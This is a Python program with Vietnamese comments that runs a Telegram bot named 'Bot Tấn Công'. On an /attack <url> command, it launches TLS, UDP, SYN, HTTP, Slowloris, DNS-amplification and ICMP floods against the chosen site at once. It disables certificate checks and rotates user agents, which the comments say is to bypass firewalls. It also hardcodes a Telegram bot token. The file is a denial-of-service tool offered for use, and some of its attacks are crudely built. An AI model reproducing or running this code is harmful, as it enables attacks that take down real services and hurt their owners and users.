import threading
import aiohttp
import asyncio
import sys
import time
import os
import random
import ssl
import socket
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from flask import Flask, jsonify

# Tạo ứng dụng Flask
app = Flask(__name__)

@app.route('/health')
def health_check():
    """Endpoint để kiểm tra trạng thái của bot"""
    return jsonify({"status": "ok"}), 200

# Danh sách User-Agent để tránh bị chặn
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
]

# Tạo kết nối SSL để bypass firewall
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

headers = {
    "User-Agent": random.choice(user_agents),
    "Connection": "keep-alive"  # Giữ kết nối mở để tạo tải cao hơn
}

so_request = 0
lock = threading.Lock()

# Sử dụng threading.Event để quản lý trạng thái dừng
stop_event = threading.Event()

# Biến toàn cục để lưu trạng thái tấn công
attack_status = {
    "tls_flood": False,
    "udp_flood": False,
    "syn_flood": False,
    "http_flood": False,
    "slowloris": False,
    "dns_amplification": False,
    "icmp_flood": False
}
target_info = {"url": None, "ip": None, "port": None, "dns_server": "8.8.8.8"}

# Hàm phân giải tên miền thành IP
def resolve_domain_to_ip(url):
    try:
        # Loại bỏ "http://" hoặc "https://" và đường dẫn
        domain = url.split("//")[-1].split("/")[0]
        # Phân giải tên miền thành IP
        ip = socket.gethostbyname(domain)
        return ip
    except Exception as e:
        print(f"Lỗi khi phân giải tên miền: {e}")
        return None

# Hàm tấn công TLS Flood
async def attack_tls_flood(session, url):
    """Tấn công TLS bằng cách giữ kết nối mở"""
    global so_request
    while not stop_event.is_set():
        try:
            method = random.choice(["GET", "POST"])
            data = {"data": random.randint(1, 100000)} if method == "POST" else None
            
            # Tăng thời gian chờ kết nối lên 30 giây
            timeout = aiohttp.ClientTimeout(total=30)
            async with session.request(method, url, headers=headers, data=data, ssl=ssl_context, timeout=timeout) as response:
                with lock:
                    if response.status == 200:
                        so_request += 1

                sys.stdout.write(
                    f"Số request: {so_request} | Mã phản hồi: {response.status} | Method: {method} | TLS Flood\r"
                )
                sys.stdout.flush()
        except Exception as e:
            print(f"Lỗi TLS Flood: {e}")

# Hàm tấn công UDP Flood
def udp_flood(target_ip, target_port):
    """Tấn công UDP Flood bằng cách gửi các gói tin UDP liên tục"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(65507)  # Tăng kích thước gói tin lên tối đa 65507 byte

    while not stop_event.is_set():
        try:
            sock.sendto(bytes, (target_ip, target_port))
            print(f"Gửi gói tin UDP đến {target_ip}:{target_port}")
        except Exception as e:
            print(f"Lỗi khi gửi gói tin UDP: {e}")

# Hàm tấn công SYN Flood
def syn_flood(target_ip, target_port):
    """Tấn công SYN Flood bằng cách gửi các gói tin SYN giả mạo"""
    if os.name != "nt":  # Chỉ chạy trên hệ điều hành không phải Windows
        while not stop_event.is_set():
            try:
                # Tạo socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                # Tạo gói tin TCP giả mạo
                packet = random._urandom(1024)  # Gói tin ngẫu nhiên
                sock.sendto(packet, (target_ip, target_port))
                print(f"Gửi gói tin SYN đến {target_ip}:{target_port}")
            except Exception as e:
                print(f"Lỗi khi gửi gói tin SYN: {e}")
    else:
        print("SYN Flood không được hỗ trợ trên Windows.")

# Hàm tấn công HTTP Flood
async def http_flood(url):
    """Tấn công HTTP Flood bằng cách gửi các yêu cầu HTTP liên tục"""
    while not stop_event.is_set():
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as response:
                    print(f"Gửi yêu cầu HTTP đến {url} | Mã phản hồi: {response.status}")
        except Exception as e:
            print(f"Lỗi HTTP Flood: {e}")

# Hàm tấn công Slowloris
def slowloris(target_ip, target_port):
    """Tấn công Slowloris bằng cách giữ kết nối HTTP mở"""
    while not stop_event.is_set():
        try:
            # Tạo socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            # Gửi yêu cầu HTTP không hoàn chỉnh
            sock.send(b"GET / HTTP/1.1\r\n")
            sock.send(b"Host: " + target_ip.encode() + b"\r\n")
            sock.send(b"User-Agent: Slowloris\r\n")
            sock.send(b"Content-Length: 1000000\r\n\r\n")
            print(f"Giữ kết nối đến {target_ip}:{target_port}")
            time.sleep(10)  # Giữ kết nối trong 10 giây
        except Exception as e:
            print(f"Lỗi Slowloris: {e}")

# Hàm tấn công DNS Amplification
def dns_amplification(target_ip, dns_server):
    """Tấn công DNS Amplification bằng cách gửi yêu cầu DNS giả mạo"""
    while not stop_event.is_set():
        try:
            # Tạo socket UDP
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Tạo yêu cầu DNS giả mạo
            dns_query = b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"
            sock.sendto(dns_query, (dns_server, 53))
            print(f"Gửi yêu cầu DNS đến {dns_server} | Đích: {target_ip}")
        except Exception as e:
            print(f"Lỗi khi gửi yêu cầu DNS: {e}")

# Hàm tấn công ICMP Flood
def icmp_flood(target_ip):
    """Tấn công ICMP Flood bằng cách gửi các gói tin ICMP liên tục"""
    while not stop_event.is_set():
        try:
            # Gửi gói tin ICMP (ping)
            response = os.system(f"ping {target_ip} -n 1")
            if response == 0:
                print(f"Gửi gói tin ICMP đến {target_ip}")
            else:
                print(f"Máy chủ {target_ip} không phản hồi ICMP.")
        except Exception as e:
            print(f"Lỗi ICMP Flood: {e}")

# Hàm xử lý lệnh /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Chào mừng bạn đến với Bot Tấn Công!\n"
        "Các lệnh có sẵn:\n"
        "/attack <url> - Bắt đầu tấn công\n"
        "/stop - Dừng tất cả cuộc tấn công"
    )

# Hàm xử lý lệnh /attack
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_status, target_info, stop_event
    if len(context.args) < 1:
        await update.message.reply_text("Vui lòng nhập URL: /attack <url>")
        return

    url = context.args[0]

    # Kiểm tra URL
    if not (url.startswith("http://") or url.startswith("https://")):
        url = "https://" + url

    # Phân giải tên miền thành IP
    target_ip = resolve_domain_to_ip(url)
    if not target_ip:
        await update.message.reply_text("Không thể phân giải tên miền thành IP.")
        return

    # Xác định cổng dựa trên giao thức
    target_port = 80 if url.startswith("http://") else 443

    # Lưu thông tin mục tiêu
    target_info["url"] = url
    target_info["ip"] = target_ip
    target_info["port"] = target_port

    # Đặt lại stop_event
    stop_event.clear()

    # Bắt đầu tấn công TLS Flood
    attack_status["tls_flood"] = True
    await update.message.reply_text(f"Bắt đầu tấn công TLS Flood đến {url}")

    # Bắt đầu tấn công UDP Flood
    attack_status["udp_flood"] = True
    await update.message.reply_text(f"Bắt đầu tấn công UDP Flood đến {target_ip}:{target_port}")

    # Bắt đầu tấn công SYN Flood
    attack_status["syn_flood"] = True
    await update.message.reply_text(f"Bắt đầu tấn công SYN Flood đến {target_ip}:{target_port}")

    # Bắt đầu tấn công HTTP Flood
    attack_status["http_flood"] = True
    await update.message.reply_text(f"Bắt đầu tấn công HTTP Flood đến {url}")

    # Bắt đầu tấn công Slowloris
    attack_status["slowloris"] = True
    await update.message.reply_text(f"Bắt đầu tấn công Slowloris đến {target_ip}:{target_port}")

    # Bắt đầu tấn công DNS Amplification
    attack_status["dns_amplification"] = True
    await update.message.reply_text(f"Bắt đầu tấn công DNS Amplification đến {target_ip}")

    # Bắt đầu tấn công ICMP Flood
    attack_status["icmp_flood"] = True
    await update.message.reply_text(f"Bắt đầu tấn công ICMP Flood đến {target_ip}")

    # Tạo luồng cho TLS Flood
    async def run_tls_flood():
        async with aiohttp.ClientSession() as session:
            await attack_tls_flood(session, url)

    tls_thread = threading.Thread(target=asyncio.run, args=(run_tls_flood(),))
    tls_thread.start()

    # Tạo luồng cho UDP Flood
    udp_thread = threading.Thread(target=udp_flood, args=(target_ip, target_port))
    udp_thread.start()

    # Tạo luồng cho SYN Flood
    syn_thread = threading.Thread(target=syn_flood, args=(target_ip, target_port))
    syn_thread.start()

    # Tạo luồng cho HTTP Flood
    http_thread = threading.Thread(target=asyncio.run, args=(http_flood(url),))
    http_thread.start()

    # Tạo luồng cho Slowloris
    slowloris_thread = threading.Thread(target=slowloris, args=(target_ip, target_port))
    slowloris_thread.start()

    # Tạo luồng cho DNS Amplification
    dns_thread = threading.Thread(target=dns_amplification, args=(target_ip, target_info["dns_server"]))
    dns_thread.start()

    # Tạo luồng cho ICMP Flood
    icmp_thread = threading.Thread(target=icmp_flood, args=(target_ip,))
    icmp_thread.start()

# Hàm xử lý lệnh /stop
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_event
    stop_event.set()
    try:
        await update.message.reply_text("Đã dừng tất cả cuộc tấn công.")
    except Exception as e:
        print(f"Lỗi khi gửi thông báo dừng: {e}")

# Hàm chạy Telegram Bot
def run_telegram_bot():
    # Khởi tạo bot Telegram
    application = Application.builder().token("6373184346:AAFkcpWzQWiIbjUeFH5iwtIxWRYItCdi-aM").build()

    # Đăng ký các lệnh
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("stop", stop))

    # Chạy bot
    application.run_polling()

# Hàm chạy Flask
def run_flask():
    app.run(host="0.0.0.0", port=5000)

# Hàm chính để chạy cả Flask và Telegram Bot
def main():
    # Tạo và chạy thread cho Flask
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.start()

    # Chạy Telegram Bot trong thread chính
    run_telegram_bot()

if __name__ == "__main__":
    main()